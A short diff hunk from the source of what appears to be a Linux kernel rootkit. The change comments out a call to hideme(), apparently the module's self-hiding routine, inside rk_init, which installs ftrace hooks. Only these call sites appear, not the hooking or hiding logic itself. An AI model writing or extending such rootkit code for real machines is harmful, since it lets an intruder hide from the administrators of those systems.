@@ -125,7 +125,7 @@ void hideme(void)
 }
 
 static int __init rk_init(void){
-	hideme();
+	//hideme();
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
